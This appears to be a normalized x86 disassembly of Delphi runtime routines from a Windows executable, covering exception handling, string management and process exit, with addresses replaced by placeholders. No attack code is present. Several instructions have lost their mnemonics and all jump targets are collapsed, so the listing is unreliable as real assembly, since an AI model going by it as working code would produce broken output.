mov eax [ ebp - 0x4 ]
push eax
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_401348
retn
sub_403624
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4036cc
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403724
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404ed8
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403744
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4061ac
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403774
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4037f8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403808
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4037ff
lea eax [ ebp - 0x8 ]
call sub_406194
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403744
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4061ac
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403808
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_40384c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4038ec
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40388c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_4038bc
push eax
push ecx
mov eax [ eax ]
call sub_40388c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404420
call [ rw-data ]
sub_4038d4
push esi
mov esi edx
mov eax [ eax ]
call sub_40388c
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404420
call [ rw-data ]
sub_40391c
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40388c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403944
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403994
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_4039d4
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403a24
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403a4d
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403ab8
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403af4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403b08
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403b1c
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403b3c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403b1c
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403ba0
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4035ec
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_4067f8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403b08
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403ab8
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403ccc
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4035ec
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403ab8
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_4067f8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403af4
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402f54
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403e54
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403b3c
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403e8c
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_404420
sub_403eb4
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_4067f8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4036c0
call sub_403a9c
sub_403f08
call sub_4067f8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4036c0
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403b64
jmp edx
sub_403f50
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_402848
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_4040b0
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_4040d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_40411e
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_404138
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_40417e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_4041d8
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_406660
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_404200
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_404224
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_404280
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_4042b0
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_4012c0
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401270
push eax
call sub_4012a8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401270
push eax
call sub_4012a8
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_40433c
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_404224
call sub_4042b0
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_4040d8
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4040b0
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_406124
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_404280
push eax
call sub_4012d8
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_40442c
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402764
pop eax
sub_404450
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402764
sub_404480
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4044f0
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028fc
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402764
sub_4044c4
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402764
sub_4044f0
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_402744
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_40451c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4044f0
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_40442c
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028fc
sub_40454c
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
push 0x0
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404580
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40442c
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404a68
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_40454c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_40454c
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404a68
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40451c
jmp r-xdata
sub_40461c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40451c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_40464c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404580
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404694
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_40451c
not ecx
sub_4046c0
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028fc
pop ebx
retn
mov ecx ebx
sub_4046ec
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_404480
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404a68
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404a68
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028fc
pop edi
pop esi
pop ebx
retn
sub_404730
test edx edx
je r-xdata
mov edx ecx
jmp sub_404480
test ecx ecx
je sub_404480
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4046ec
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4044f0
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028fc
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028fc
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_404480
pop edx
pop eax
jmp sub_4046ec
call sub_404480
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4047a4
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi eax
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4044f0
push eax
mov esi eax
mov edx eax
mov eax edi
mov esi [ edi ]
mov esi [ esi - 0x4 ]
call sub_404a68
push edi
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028fc
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_404480
dec [ edx - 0x8 ]
sub_404828
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4048e8
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4044f0
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028fc
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402764
sub_40493c
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_40442c
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_40451c
jmp r-xdata
pop ebx
retn 0x4
sub_40497c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4048e8
